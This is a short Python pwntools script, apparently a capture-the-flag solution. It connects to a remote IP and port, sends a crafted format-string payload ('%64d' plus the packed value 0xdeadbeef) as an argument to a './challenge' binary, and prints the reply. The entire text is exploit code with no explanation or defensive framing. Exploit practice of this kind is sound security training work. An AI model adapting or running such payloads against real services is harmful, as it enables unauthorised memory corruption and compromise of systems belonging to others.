from pwn import *

conn=remote('52.142.207.127',5902)
payload=""
payload+="%64d"
payload+=p32(0xdeadbeef)
execute="./challenge "
conn.sendline(execute+payload)
print conn.recvline()

